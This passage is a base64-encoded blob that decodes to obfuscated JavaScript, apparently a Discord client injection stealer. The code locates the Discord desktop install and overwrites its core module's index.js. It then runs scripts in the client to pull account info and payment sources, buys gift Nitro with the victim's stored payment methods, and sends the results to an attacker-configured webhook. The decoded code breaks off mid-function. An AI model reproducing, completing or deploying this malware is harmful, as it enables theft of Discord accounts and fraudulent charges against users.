U3RyaW5nXHgyMG9mXHgyMEhFWFx4MjB0eXBlXHgyMG11c3RceDIwYmVceDIwaW5ceDIwYnl0ZVx4MjBpbmNyZW1lbnRzJyk7Zm9yKF8weDMwZDM3OD0weDA7XzB4MzBkMzc4PF8weDFkMDY0YjtfMHgzMGQzNzgrPTB4Mil7XzB4MjdmNDE2PXBhcnNlSW50KF8weDg5NDZbJ3N1YnN0ciddKF8weDMwZDM3OCwweDIpLDB4MTApO2lmKCFpc05hTihfMHgyN2Y0MTYpKXtfMHg1ZjFjYmM9KF8weDMwZDM3OD4+PjB4MSkrXzB4NGE1OTVmLF8weDhiNDllNj1fMHg1ZjFjYmM+Pj4weDI7d2hpbGUoXzB4MWQwZWI5W18weDM3OTk5ZSgweDI3YSldPD1fMHg4YjQ5ZTYpe18weDFkMGViOVsncHVzaCddKDB4MCk7fV8weDFkMGViOVtfMHg4YjQ5ZTZdfD1fMHgyN2Y0MTY8PDB4OCooMHgzLV8weDVmMWNiYyUweDQpO31lbHNlIGNvbnNvbGVbXzB4Mzc5OTllKDB4MWQ0KV0oXzB4Mzc5OTllKDB4MWY3KSk7fXJldHVybnsndmFsdWUnOl8weDFkMGViOSwnYmluTGVuJzpfMHgxZDA2NGIqMHg0K18weDJkNGJiOX07fWNsYXNzIGpzU0hBe2NvbnN0cnVjdG9yKCl7Y29uc3QgXzB4Mzc5MWI0PV8weDNkOGY4ZTt2YXIgXzB4NWIyM2IxPTB4MCxfMHg1ZGNmYjY9W10sXzB4Mjc5ZGE3PTB4MCxfMHg1NDRiNzMsXzB4YmZmM2VlLF8weDEzMDEwMSxfMHg0MDAzY2YsXzB4Y2JmZTRhLF8weDM4ZjA0MCxfMHgxMjNhM2U9IVtdLF8weDM5YTY2MD0hW10sXzB4M2M5YzIwPVtdLF8weDIzNDgwMj1bXSxfMHg1MTgyN2UsXzB4NTE4MjdlPTB4MTtfMHhiZmYzZWU9aGV4MmJpbmIsKF8weDUxODI3ZSE9PXBhcnNlSW50KF8weDUxODI3ZSwweGEpfHwweDE+XzB4NTE4MjdlKSYmY29uc29sZVsnZXJyb3InXShfMHgzNzkxYjQoMHgyM2YpKSxfMHg0MDAzY2Y9MHgyMDAsXzB4Y2JmZTRhPXJvdW5kU0hBMSxfMHgzOGYwNDA9ZmluYWxpemVTSEExLF8weDEzMDEwMT0weGEwLF8weDU0NGI3Mz1nZXRIKCksdGhpc1tfMHgzNzkxYjQoMHgyMmEpXT1mdW5jdGlvbihfMHg1OGM3NDkpe2NvbnN0IF8weDE1Zjc3MD1fMHgzNzkxYjQ7dmFyIF8weDNlZGNhNixfMHgxZTI5ODgsXzB4MmUyNDBjLF8weDQyNjlkZCxfMHg0NDlmYjcsXzB4NGY3NGZiLF8weDEwNjQ3ZDtfMHgzZWRjYTY9aGV4MmJpbmIsXzB4MWUyOTg4PV8weDNlZGNhNihfMHg1OGM3NDkpLF8weDJlMjQwYz1fMHgxZTI5ODhbXzB4MTVmNzcwKDB4MWQ1KV0sXzB4NDI2OWRkPV8weDFlMjk4OFtfMHgxNWY3NzAoMHgyMTkpXSxfMHg0NDlmYjc9XzB4NDAwM2NmPj4+MHgzLF8weDEwNjQ3ZD1fMHg0NDlmYjcvMHg0LTB4MTtpZihfMHg0NDlmYjc8XzB4MmUyNDBjLzB4OCl7XzB4NDI2OWRkPV8weDM4ZjA0MChfMHg0MjY5ZGQsXzB4MmUyNDBjLDB4MCxnZXRIKCkpO3doaWxlKF8weDQyNjlkZFtfMHgxNWY3NzAoMHgyN2EpXTw9XzB4MTA2NDdkKXtfMHg0MjY5ZGRbXzB4MTVmNzcwKDB4MjU3KV0oMHgwKTt9XzB4NDI2OWRkW18weDEwNjQ3ZF0mPTB4ZmZmZmZmMDA7fWVsc2V7aWYoXzB4NDQ5ZmI3Pl8weDJlMjQwYy8weDgpe3doaWxlKF8weDQyNjlkZFtfMHgxNWY3NzAoMHgyN2EpXTw9XzB4MTA2NDdkKXtfMHg0MjY5ZGRbXzB4MTVmNzcwKDB4MjU3KV0oMHgwKTt9XzB4NDI2OWRkW18weDEwNjQ3ZF0mPTB4ZmZmZmZmMDA7fX1mb3IoXzB4NGY3NGZiPTB4MDtfMHg0Zjc0ZmI8PV8weDEwNjQ3ZDtfMHg0Zjc0ZmIrPTB4MSl7XzB4M2M5YzIwW18weDRmNzRmYl09XzB4NDI2OWRkW18weDRmNzRmYl1eMHgzNjM2MzYzNixfMHgyMzQ4MDJbXzB4NGY3NGZiXT1fMHg0MjY5ZGRbXzB4NGY3NGZiXV4weDVjNWM1YzVjO31fMHg1NDRiNzM9XzB4Y2JmZTRhKF8weDNjOWMyMCxfMHg1NDRiNzMpLF8weDViMjNiMT1fMHg0MDAzY2YsXzB4MzlhNjYwPSEhW107fSx0aGlzW18weDM3OTFiNCgweDFkMSldPWZ1bmN0aW9uKF8weGI4YTc0Mil7Y29uc3QgXzB4MzdhNTcyPV8weDM3OTFiNDt2YXIgXzB4NWI5MjIxLF8weDE0M2I2NyxfMHg1NzYyZTAsXzB4MTk3MzdjLF8weDQzZDViYSxfMHg1NDJkNTc9MHgwLF8weDFlZTYzNj1fMHg0MDAzY2Y+Pj4weDU7XzB4NWI5MjIxPV8weGJmZjNlZShfMHhiOGE3NDIsXzB4NWRjZmI2LF8weDI3OWRhNyksXzB4MTQzYjY3PV8weDViOTIyMVtfMHgzN2E1NzIoMHgxZDUpXSxfMHgxOTczN2M9XzB4NWI5MjIxW18weDM3YTU3MigweDIxOSldLF8weDU3NjJlMD1fMHgxNDNiNjc+Pj4weDU7Zm9yKF8weDQzZDViYT0weDA7XzB4NDNkNWJhPF8weDU3NjJlMDtfMHg0M2Q1YmErPV8weDFlZTYzNil7XzB4NTQyZDU3K18weDQwMDNjZjw9XzB4MTQzYjY3JiYoXzB4NTQ0YjczPV8weGNiZmU0YShfMHgxOTczN2NbXzB4MzdhNTcyKDB4MWUwKV0oXzB4NDNkNWJhLF8weDQzZDViYStfMHgxZWU2MzYpLF8weDU0NGI3MyksXzB4NTQyZDU3Kz1fMHg0MDAzY2YpO31fMHg1YjIzYjErPV8weDU0MmQ1NyxfMHg1ZGNmYjY9XzB4MTk3MzdjWydzbGljZSddKF8weDU0MmQ1Nz4+PjB4NSksXzB4Mjc5ZGE3PV8weDE0M2I2NyVfMHg0MDAzY2Y7fSx0aGlzW18weDM3OTFiNCgweDFmMyldPWZ1bmN0aW9uKCl7Y29uc3QgXzB4NTEzMjE0PV8weDM3OTFiNDt2YXIgXzB4MTVjNDAyOyFbXT09PV8weDM5YTY2MCYmY29uc29sZVsnZXJyb3InXShfMHg1MTMyMTQoMHgyOTIpKTtjb25zdCBfMHg1NTc1MzU9ZnVuY3Rpb24oXzB4NDI4MzVmKXtyZXR1cm4gYmluYjJoZXgoXzB4NDI4MzVmKTt9O3JldHVybiFbXT09PV8weDEyM2EzZSYmKF8weDE1YzQwMj1fMHgzOGYwNDAoXzB4NWRjZmI2LF8weDI3OWRhNyxfMHg1YjIzYjEsXzB4NTQ0YjczKSxfMHg1NDRiNzM9XzB4Y2JmZTRhKF8weDIzNDgwMixnZXRIKCkpLF8weDU0NGI3Mz1fMHgzOGYwNDAoXzB4MTVjNDAyLF8weDEzMDEwMSxfMHg0MDAzY2YsXzB4NTQ0YjczKSksXzB4MTIzYTNlPSEhW10sXzB4NTU3NTM1KF8weDU0NGI3Myk7fTt9fWlmKF8weDNkOGY4ZSgweDI1Zik9PT10eXBlb2YgZGVmaW5lJiZkZWZpbmVbXzB4M2Q4ZjhlKDB4MWQwKV0pZGVmaW5lKGZ1bmN0aW9uKCl7cmV0dXJuIGpzU0hBO30pO2Vsc2UgXzB4M2Q4ZjhlKDB4MjUxKSE9PXR5cGVvZiBleHBvcnRzPyd1bmRlZmluZWQnIT09dHlwZW9mIG1vZHVsZSYmbW9kdWxlWydleHBvcnRzJ10/bW9kdWxlWydleHBvcnRzJ109ZXhwb3J0cz1qc1NIQTpleHBvcnRzPWpzU0hBOmdsb2JhbFtfMHgzZDhmOGUoMHgyMWYpXT1qc1NIQTtqc1NIQVtfMHgzZDhmOGUoMHgyYTApXSYmKGpzU0hBPWpzU0hBW18weDNkOGY4ZSgweDJhMCldKTtmdW5jdGlvbiB0b3RwKF8weDFlOWYzMCl7Y29uc3QgXzB4MjQ3M2U4PV8weDNkOGY4ZSxfMHgxMTAyNjI9MHgxZSxfMHgxN2E1MmQ9MHg2LF8weDFiMmU0OD1EYXRlW18weDI0NzNlOCgweDI5NCldKCksXzB4NGQwNTI5PU1hdGhbXzB4MjQ3M2U4KDB4MjIzKV0oXzB4MWIyZTQ4LzB4M2U4KSxfMHg1ZDhmYWY9bGVmdHBhZChkZWMyaGV4KE1hdGhbJ2Zsb29yJ10oXzB4NGQwNTI5L18weDExMDI2MikpLDB4MTAsJzAnKSxfMHg1YzBhNWQ9bmV3IGpzU0hBKCk7XzB4NWMwYTVkW18weDI0NzNlOCgweDIyYSldKGJhc2UzMnRvaGV4KF8weDFlOWYzMCkpLF8weDVjMGE1ZFtfMHgyNDczZTgoMHgxZDEpXShfMHg1ZDhmYWYpO2NvbnN0IF8weDEwZTQ2Mj1fMHg1YzBhNWRbJ2dldEhNQUMnXSgpLF8weDFkMWNkYj1oZXgyZGVjKF8weDEwZTQ2MltfMHgyNDczZTgoMHgxZDMpXShfMHgxMGU0NjJbXzB4MjQ3M2U4KDB4MjdhKV0tMHgxKSk7bGV0IF8weDViYzkyZD0oaGV4MmRlYyhfMHgxMGU0NjJbXzB4MjQ3M2U4KDB4MWU5KV0oXzB4MWQxY2RiKjB4MiwweDgpKSZoZXgyZGVjKF8weDI0NzNlOCgweDI4NSkpKSsnJztyZXR1cm4gXzB4NWJjOTJkPV8weDViYzkyZFtfMHgyNDczZTgoMHgxZTkpXShNYXRoWydtYXgnXShfMHg1YmM5MmRbXzB4MjQ3M2U4KDB4MjdhKV0tXzB4MTdhNTJkLDB4MCksXzB4MTdhNTJkKSxfMHg1YmM5MmQ7fWZ1bmN0aW9uIGhleDJkZWMoXzB4M2E1YWQ3KXtyZXR1cm4gcGFyc2VJbnQoXzB4M2E1YWQ3LDB4MTApO31mdW5jdGlvbiBkZWMyaGV4KF8weDRkYjk2Zil7Y29uc3QgXzB4MTAyZDQ3PV8weDNkOGY4ZTtyZXR1cm4oXzB4NGRiOTZmPDE1LjU/JzAnOicnKStNYXRoW18weDEwMmQ0NygweDIyMyldKF8weDRkYjk2ZilbXzB4MTAyZDQ3KDB4MmExKV0oMHgxMCk7fWZ1bmN0aW9uIGJhc2UzMnRvaGV4KF8weDUyZTRkOSl7Y29uc3QgXzB4MzI5MWJjPV8weDNkOGY4ZTtsZXQgXzB4MWZlYjI0PV8weDMyOTFiYygweDIxNCksXzB4MzBjODM2PScnLF8weDJiZWRlNz0nJztfMHg1MmU0ZDk9XzB4NTJlNGQ5W18weDMyOTFiYygweDI4NyldKC89KyQvLCcnKTtmb3IobGV0IF8weDI4ODZmMT0weDA7XzB4Mjg4NmYxPF8weDUyZTRkOVtfMHgzMjkxYmMoMHgyN2EpXTtfMHgyODg2ZjErKyl7bGV0IF8weDI4Mzk1Mj1fMHgxZmViMjRbXzB4MzI5MWJjKDB4MWU2KV0oXzB4NTJlNGQ5W18weDMyOTFiYygweDFmZildKF8weDI4ODZmMSlbXzB4MzI5MWJjKDB4MjA1KV0oKSk7aWYoXzB4MjgzOTUyPT09LTB4MSljb25zb2xlW18weDMyOTFiYygweDFkNCldKF8weDMyOTFiYygweDI2MCkpO18weDMwYzgzNis9bGVmdHBhZChfMHgyODM5NTJbXzB4MzI5MWJjKDB4MmExKV0oMHgyKSwweDUsJzAnKTt9Zm9yKGxldCBfMHgyNGJmOGQ9MHgwO18weDI0YmY4ZCsweDg8PV8weDMwYzgzNlsnbGVuZ3RoJ107XzB4MjRiZjhkKz0weDgpe2xldCBfMHgzZGJiNTc9XzB4MzBjODM2W18weDMyOTFiYygweDFlOSldKF8weDI0YmY4ZCwweDgpO18weDJiZWRlNz1fMHgyYmVkZTcrbGVmdHBhZChwYXJzZUludChfMHgzZGJiNTcsMHgyKVtfMHgzMjkxYmMoMHgyYTEpXSgweDEwKSwweDIsJzAnKTt9cmV0dXJuIF8weDJiZWRlNzt9ZnVuY3Rpb24gbGVmdHBhZChfMHg0NTMyYjIsXzB4MzVkMzRhLF8weDMzNmM4ZCl7Y29uc3QgXzB4NTk3MmJhPV8weDNkOGY4ZTtyZXR1cm4gXzB4MzVkMzRhKzB4MT49XzB4NDUzMmIyW18weDU5NzJiYSgweDI3YSldJiYoXzB4NDUzMmIyPUFycmF5KF8weDM1ZDM0YSsweDEtXzB4NDUzMmIyWydsZW5ndGgnXSlbXzB4NTk3MmJhKDB4MWZhKV0oXzB4MzM2YzhkKStfMHg0NTMyYjIpLF8weDQ1MzJiMjt9Y29uc3QgZGlzY29yZFBhdGg9KGZ1bmN0aW9uKCl7Y29uc3QgXzB4MTcyMTBjPV8weDNkOGY4ZSxfMHg1NTEwODE9YXJnc1sweDBdWydzcGxpdCddKHBhdGhbXzB4MTcyMTBjKDB4MjQwKV0pWydzbGljZSddKDB4MCwtMHgxKVsnam9pbiddKHBhdGhbJ3NlcCddKTtsZXQgXzB4MTQxODVkO2lmKHByb2Nlc3NbXzB4MTcyMTBjKDB4MjIxKV09PT1fMHgxNzIxMGMoMHgyMDgpKV8weDE0MTg1ZD1wYXRoW18weDE3MjEwYygweDFmYSldKF8weDU1MTA4MSwncmVzb3VyY2VzJyk7ZWxzZSBwcm9jZXNzWydwbGF0Zm9ybSddPT09XzB4MTcyMTBjKDB4MjhiKSYmKF8weDE0MTg1ZD1wYXRoW18weDE3MjEwYygweDFmYSldKF8weDU1MTA4MSxfMHgxNzIxMGMoMHgyMjUpLF8weDE3MjEwYygweDIwMSkpKTtpZihmc1tfMHgxNzIxMGMoMHgyNDMpXShfMHgxNDE4NWQpKXJldHVybnsncmVzb3VyY2VQYXRoJzpfMHgxNDE4NWQsJ2FwcCc6XzB4NTUxMDgxfTtyZXR1cm57J3VuZGVmaW5lZCc6dW5kZWZpbmVkLCd1bmRlZmluZWQnOnVuZGVmaW5lZH07fSgpKTtmdW5jdGlvbiB1cGRhdGVDaGVjaygpe2NvbnN0IF8weDRhMjQwYz1fMHgzZDhmOGUse3Jlc291cmNlUGF0aDpfMHg1M2ZhYWIsYXBwOl8weDRjYjJmYX09ZGlzY29yZFBhdGg7aWYoXzB4NTNmYWFiPT09dW5kZWZpbmVkfHxfMHg0Y2IyZmE9PT11bmRlZmluZWQpcmV0dXJuO2NvbnN0IF8weDU3OTRlZj1wYXRoW18weDRhMjQwYygweDFmYSldKF8weDUzZmFhYixfMHg0YTI0MGMoMHgyMWQpKSxfMHg0ZjBkNjY9cGF0aFtfMHg0YTI0MGMoMHgxZmEpXShfMHg1Nzk0ZWYsJ3BhY2thZ2UuanNvbicpLF8weDNlZmFmMT1wYXRoW18weDRhMjQwYygweDFmYSldKF8weDU3OTRlZiwnaW5kZXguanMnKSxfMHgyN2M0Njg9ZnNbJ3JlYWRkaXJTeW5jJ10oXzB4NGNiMmZhKydceDVjbW9kdWxlc1x4NWMnKVtfMHg0YTI0MGMoMHgyMmYpXShfMHhiOWViYTA9Pi9kaXNjb3JkX2Rlc2t0b3BfY29yZS0rPy9bJ3Rlc3QnXShfMHhiOWViYTApKVsweDBdLF8weDFhNWQ4Nj1fMHg0Y2IyZmErXzB4NGEyNDBjKDB4MjBlKStfMHgyN2M0NjgrXzB4NGEyNDBjKDB4MjRiKSxfMHgyZTJjMGE9cGF0aFsnam9pbiddKHByb2Nlc3NbXzB4NGEyNDBjKDB4Mjc2KV1bXzB4NGEyNDBjKDB4MjIwKV0sJ1x4NWNiZXR0ZXJkaXNjb3JkXHg1Y2RhdGFceDVjYmV0dGVyZGlzY29yZC5hc2FyJyk7aWYoIWZzW18weDRhMjQwYygweDI0MyldKF8weDU3OTRlZikpZnNbXzB4NGEyNDBjKDB4MjVjKV0oXzB4NTc5NGVmKTtpZihmc1snZXhpc3RzU3luYyddKF8weDRmMGQ2NikpZnNbJ3VubGlua1N5bmMnXShfMHg0ZjBkNjYpO2lmKGZzW18weDRhMjQwYygweDI0MyldKF8weDNlZmFmMSkpZnNbXzB4NGEyNDBjKDB4MjI2KV0oXzB4M2VmYWYxKTtpZihwcm9jZXNzW18weDRhMjQwYygweDIyMSldPT09XzB4NGEyNDBjKDB4MjA4KXx8cHJvY2Vzc1tfMHg0YTI0MGMoMHgyMjEpXT09PV8weDRhMjQwYygweDI4Yikpe2ZzW18weDRhMjQwYygweDIzOCldKF8weDRmMGQ2NixKU09OW18weDRhMjQwYygweDI2OSldKHsnbmFtZSc6XzB4NGEyNDBjKDB4MWZjKSwnbWFpbic6XzB4NGEyNDBjKDB4MWVkKX0sbnVsbCwweDQpKTtjb25zdCBfMHgxMWI2OWY9XzB4NGEyNDBjKDB4MjRjKStfMHgxYTVkODYrJ1x4Mjc7XHgwYWNvbnN0XHgyMGJkUGF0aFx4MjA9XHgyMFx4MjcnK18weDJlMmMwYStfMHg0YTI0MGMoMHgyNmYpK2NvbmZpZ1tfMHg0YTI0MGMoMHgyNGUpXStfMHg0YTI0MGMoMHgyMmIpK2hvb2srXzB4NGEyNDBjKDB4Mjc0KStjb25maWdbJ3dlYmhvb2tfcHJvdGVjdG9yX2tleSddK18weDRhMjQwYygweDIxMCkrcGF0aFtfMHg0YTI0MGMoMHgxZmEpXShfMHg1M2ZhYWIsXzB4NGEyNDBjKDB4MjJlKSkrXzB4NGEyNDBjKDB4MjdiKTtmc1tfMHg0YTI0MGMoMHgyMzgpXShfMHgzZWZhZjEsXzB4MTFiNjlmW18weDRhMjQwYygweDI4NyldKC9cXC9nLCdceDVjXHg1YycpKTt9aWYoIWZzW18weDRhMjQwYygweDI0MyldKHBhdGhbXzB4NGEyNDBjKDB4MWZhKV0oX19kaXJuYW1lLF8weDRhMjQwYygweDIwNCkpKSlyZXR1cm4hMHgwO3JldHVybiBmc1tfMHg0YTI0MGMoMHgyNDgpXShwYXRoW18weDRhMjQwYygweDFmYSldKF9fZGlybmFtZSxfMHg0YTI0MGMoMHgyMDQpKSksZXhlY1NjcmlwdChfMHg0YTI0MGMoMHgyOWYpKSwhMHgxO31jb25zdCBleGVjU2NyaXB0PV8weDM5ZjdmYz0+e2NvbnN0IF8weDFkMmM0NT1Ccm93c2VyV2luZG93WydnZXRBbGxXaW5kb3dzJ10oKVsweDBdO3JldHVybiBfMHgxZDJjNDVbJ3dlYkNvbnRlbnRzJ11bJ2V4ZWN1dGVKYXZhU2NyaXB0J10oXzB4MzlmN2ZjLCEweDApO30sZ2V0SW5mbz1hc3luYyBfMHg0NDRhYWQ9Pntjb25zdCBfMHg0ZmNmMWQ9XzB4M2Q4ZjhlLF8weGM1OGQ2Mz1hd2FpdCBleGVjU2NyaXB0KCd2YXJceDIweG1sSHR0cFx4MjA9XHgyMG5ld1x4MjBYTUxIdHRwUmVxdWVzdCgpO1x4MGFceDIwXHgyMFx4MjBceDIweG1sSHR0cC5vcGVuKFx4MjJHRVRceDIyLFx4MjBceDIyJytjb25maWdbXzB4NGZjZjFkKDB4MjkzKV0rXzB4NGZjZjFkKDB4MjViKStfMHg0NDRhYWQrXzB4NGZjZjFkKDB4MjQ5KSk7cmV0dXJuIEpTT05bXzB4NGZjZjFkKDB4Mjk5KV0oXzB4YzU4ZDYzKTt9LGZldGNoQmlsbGluZz1hc3luYyBfMHg1NjU1NGM9Pntjb25zdCBfMHgxMTliNWQ9XzB4M2Q4ZjhlLF8weDIzZDk4NT1hd2FpdCBleGVjU2NyaXB0KF8weDExOWI1ZCgweDI4MikrY29uZmlnWydhcGknXStfMHgxMTliNWQoMHgxZWUpK18weDU2NTU0YytfMHgxMTliNWQoMHgyMjQpKTtpZighXzB4MjNkOTg1WydsZW5naHQnXXx8XzB4MjNkOTg1W18weDExOWI1ZCgweDI3YSldPT09MHgwKXJldHVybicnO3JldHVybiBKU09OWydwYXJzZSddKF8weDIzZDk4NSk7fSxnZXRCaWxsaW5nPWFzeW5jIF8weDM5ZTVkZT0+e2NvbnN0IF8weDU2M2VmND1fMHgzZDhmOGUsXzB4M2YwODRhPWF3YWl0IGZldGNoQmlsbGluZyhfMHgzOWU1ZGUpO2lmKCFfMHgzZjA4NGEpcmV0dXJuJ+KdjCc7bGV0IF8weDJjNmNiMz0nJztfMHgzZjA4NGFbXzB4NTYzZWY0KDB4MjllKV0oXzB4NjBkNTllPT57Y29uc3QgXzB4N2YxOWVhPV8weDU2M2VmNDtpZighXzB4NjBkNTllW18weDdmMTllYSgweDIwYSldKXN3aXRjaChfMHg2MGQ1OWVbJ3R5cGUnXSl7Y2FzZSAweDE6XzB4MmM2Y2IzKz1fMHg3ZjE5ZWEoMHgxZGQpO2JyZWFrO2Nhc2UgMHgyOl8weDJjNmNiMys9XzB4N2YxOWVhKDB4MjgxKTticmVhazt9fSk7aWYoIV8weDJjNmNiMylfMHgyYzZjYjM9J+KdjCc7cmV0dXJuIF8weDJjNmNiMzt9LFB1cmNoYXNlPWFzeW5jKF8weDE3Zjg4OCxfMHg1MWRmYzIsXzB4NTExYWUzLF8weDU1ODUzNik9Pntjb25zdCBfMHhjODNiYjI9XzB4M2Q4ZjhlLF8weDQ3ZDUwZj17J2V4cGVjdGVkX2Ftb3VudCc6Y29uZmlnW18weGM4M2JiMigweDI0MSldW18weDUxMWFlM11bXzB4NTU4NTM2XVtfMHhjODNiYjIoMHgyMTUpXSwnZXhwZWN0ZWRfY3VycmVuY3knOl8weGM4M2JiMigweDI1MyksJ2dpZnQnOiEhW10sJ3BheW1lbnRfc291cmNlX2lkJzpfMHg1MWRmYzIsJ3BheW1lbnRfc291cmNlX3Rva2VuJzpudWxsLCdwdXJjaGFzZV90b2tlbic6JzI0MjI4NjdjLTI0NGQtNDc2YS1iYTRmLTM2ZTE5Nzc1OGQ5NycsJ3NrdV9zdWJzY3JpcHRpb25fcGxhbl9pZCc6Y29uZmlnW18weGM4M2JiMigweDI0MSldW18weDUxMWFlM11bXzB4NTU4NTM2XVtfMHhjODNiYjIoMHgyMWMpXX0sXzB4MWNiZjU5PWV4ZWNTY3JpcHQoJ3Zhclx4MjB4bWxIdHRwXHgyMD1ceDIwbmV3XHgyMFhNTEh0dHBSZXF1ZXN0KCk7XHgwYVx4MjBceDIwXHgyMFx4MjB4bWxIdHRwLm9wZW4oXHgyMlBPU1RceDIyLFx4MjBceDIyaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvc3RvcmUvc2t1cy8nK2NvbmZpZ1tfMHhjODNiYjIoMHgyNDEpXVtfMHg1MTFhZTNdW18weDU1ODUzNl1bJ2lkJ10rXzB4YzgzYmIyKDB4MWNkKStfMHgxN2Y4ODgrXzB4YzgzYmIyKDB4MjI3KStKU09OWydzdHJpbmdpZnknXShfMHg0N2Q1MGYpKycpKTtceDBhXHgyMFx4MjBceDIwXHgyMHhtbEh0dHAucmVzcG9uc2VUZXh0Jyk7aWYoXzB4MWNiZjU5W18weGM4M2JiMigweDFkNildKXJldHVybidodHRwczovL2Rpc2NvcmQuZ2lmdC8nK18weDFjYmY1OVtfMHhjODNiYjIoMHgxZDYpXTtlbHNlIHJldHVybiBudWxsO30sYnV5Tml0cm89YXN5bmMgXzB4NWFjYjFhPT57Y29uc3QgXzB4NWQyZGFhPV8weDNkOGY4ZSxfMHgxNmViYWI9YXdhaXQgZmV0Y2hCaWxsaW5nKF8weDVhY2IxYSksXzB4NDI1Y2ZlPV8weDVkMmRhYSgweDI5Nyk7aWYoIV8weDE2ZWJhYilyZXR1cm4gXzB4NDI1Y2ZlO2xldCBfMHg1Yzg4NDc9W107XzB4MTZlYmFiW18weDVkMmRhYSgweDI5ZSldKF8weDcyNjg3ND0+e2NvbnN0IF8weDQzMTE4Nj1fMHg1ZDJkYWE7IV8weDcyNjg3NFtfMHg0MzExODYoMHgyMGEpXSYmKF8weDVjODg0Nz1fMHg1Yzg4NDdbJ2NvbmNhdCddKF8weDcyNjg3NFsnaWQnXSkpO30pO2ZvcihsZXQgXzB4NTc0YWEzIGluIF8weDVjODg0Nyl7Y29uc3QgXzB4NGQwNGUyPVB1cmNoYXNlKF8weDVhY2IxYSxfMHg1NzRhYTMsXzB4NWQyZGFhKDB4MWVjKSxfMHg1ZDJkYWEoMHgyMzQpKTtpZihfMHg0ZDA0ZTIhPT1udWxsKXJldHVybiBfMHg0ZDA0ZTI7ZWxzZXtjb25zdCBfMHgxYzA2N2M9UHVyY2hhc2UoXzB4NWFjYjFhLF8weDU3NGFhMyxfMHg1ZDJkYWEoMHgxZWMpLF8weDVkMmRhYSgweDI2MykpO2lmKF8weDFjMDY3YyE9PW51bGwpcmV0dXJuIF8weDFjMDY3YztlbHNle2NvbnN0IF8weDFkNWFhZD1QdXJjaGFzZShfMHg1YWNiMWEsXzB4NTc0YWEzLF8weDVkMmRhYSgweDI4ZiksXzB4NWQyZGFhKDB4MjYzKSk7cmV0dXJuIF8weDFkNWFhZCE9PW51bGw/XzB4MWQ1YWFkOl8weDQyNWNmZTt9fX19LGdldE5pdHJvPV8weDJjYTcxYj0+e2NvbnN0IF8weDUyZWRlND1fMHgzZDhmOGU7c3dpdGNoKF8weDJjYTcxYil7Y2FzZSAweDA6cmV0dXJuIF8weDUyZWRlNCgweDI3Nyk7Y2FzZSAweDE6cmV0dXJuIF8weDUyZWRlNCgweDI0ZCk7Y2FzZSAweDI6cmV0dXJuIF8weDUyZWRlNCgweDI0Mik7ZGVmYXVsdDpyZXR1cm4gXzB4NTJlZGU0KDB4Mjc3KTt9fSxnZXRCYWRnZXM9XzB4NTZjODg0PT57Y29uc3QgXzB4YjUwZGE2PV8weDNkOGY4ZTtsZXQgXzB4MmI5ZGJlPScnO3N3aXRjaChfMHg1NmM4ODQpe2Nhc2UgMHgxOl8weDJiOWRiZSs9XzB4YjUwZGE2KDB4MjlhKTticmVhaztjYXNlIDB4MjpfMHgyYjlkYmUrPSdQYXJ0bmVyZWRceDIwU2VydmVyXHgyME93bmVyLFx4MjAnO2JyZWFrO2Nhc2UgMHgyMDAwMDpfMHgyYjlkYmUrPV8weGI1MGRhNigweDFkZik7YnJlYWs7Y2FzZSAweDQwMDAwMDpfMHgyYjlkYmUrPSdBY3RpdmVceDIwRGV2ZWxvcGVyLFx4MjAnO2JyZWFrO2Nhc2UgMHg0Ol8weDJiOWRiZSs9XzB4YjUwZGE2KDB4MWU4KTticmVhaztjYXNlIDB4NDAwMDpfMHgyYjlkYmUrPV8weGI1MGRhNigweDFkOSk7YnJlYWs7Y2FzZSAweDg6XzB4MmI5ZGJlKz1fMHhiNTBkYTYoMHgyODApO2JyZWFrO2Nhc2UgMHgyMDA6XzB4MmI5ZGJlKz1fMHhiNTBkYTYoMHgyMmMpO2JyZWFrO2Nhc2UgMHg4MDpfMHgyYjlkYmUrPV8weGI1MGRhNigweDFjZSk7YnJlYWs7Y2FzZSAweDQwOl8weDJiOWRiZSs9XzB4YjUwZGE2KDB4MjQ3KTticmVhaztjYXNlIDB4MTAwOl8weDJiOWRiZSs9XzB4YjUwZGE2KDB4MjkxKTticmVhaztjYXNlIDB4MDpfMHgyYjlkYmU9XzB4YjUwZGE2KDB4MjVkKTticmVhaztkZWZhdWx0Ol8weDJiOWRiZT1fMHhiNTBkYTYoMHgyNWQpO2JyZWFrO31yZXR1cm4gXzB4MmI5ZGJlO30saG9va2VyPWFzeW5jIF8weDViNDBjZj0+e2NvbnN0IF8weDE1YzA2ZT1fMHgzZDhmOGUsXzB4MzhkZWQ2PUpTT05bXzB4MTVjMDZlKDB4MjY5KV0oXzB4NWI0MGNmKSxfMHgzNWRjMzU9bmV3IFVSTChjb25maWdbXzB4MTVjMDZlKDB4MjAyKV0pLF8weDM3ZjNmNj17J0NvbnRlbnQtVHlwZSc6XzB4MTVjMDZlKDB4MWQ3KSwnQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luJzonKid9O2lmKCFjb25maWdbXzB4MTVjMDZlKDB4MjAyKV1bJ2luY2x1ZGVzJ10oJ2FwaS93ZWJob29rcycpKXtjb25zdCBfMHgxY2Y2ODM9dG90cChjb25maWdbXzB4MTVjMDZlKDB4MWU0KV0pO18weDM3ZjNmNlsnQXV0aG9yaXphdGlvbiddPV8weDFjZjY4Mzt9Y29uc3QgXzB4MTJmYTJhPXsncHJvdG9jb2wnOl8weDM1ZGMzNVsncHJvdG9jb2wnXSwnaG9zdG5hbWUnOl8weDM1ZGMzNVtfMHgxNWMwNmUoMHgyNTYpXSwncGF0aCc6XzB4MzVkYzM1W18weDE1YzA2ZSgweDFkZSldLCdtZXRob2QnOl8weDE1YzA2ZSgweDFkYyksJ2hlYWRlcnMnOl8weDM3ZjNmNn0sXzB4NTUyY2QxPWh0dHBzW18weDE1YzA2ZSgweDFmNSldKF8weDEyZmEyYSk7XzB4NTUyY2QxWydvbiddKF8weDE1YzA2ZSgweDFkNCksXzB4MTU3N2Y5PT57Y29uc3QgXzB4NDY1MThjPV8weDE1YzA2ZTtjb25zb2xlW18weDQ2NTE4YygweDI3OCldKF8weDE1NzdmOSk7fSksXzB4NTUyY2QxW18weDE1YzA2ZSgweDI2NildKF8weDM4ZGVkNiksXzB4NTUyY2QxW18weDE1YzA2ZSgweDFmOSldKCk7fSxsb2dpbj1hc3luYyhfMHgyMjZkYzgsXzB4MjJmNDY4LF8weDg2NDFjNCk9Pntjb25zdCBfMHg0MDVlZjk9XzB4M2Q4ZjhlLF8weDI2OWFlYz1hd2FpdCBnZXRJbmZvKF8weDg2NDFjNCksXzB4MjZkMzYyPWdldE5pdHJvKF8weDI2OWFlY1tfMHg0MDVlZjk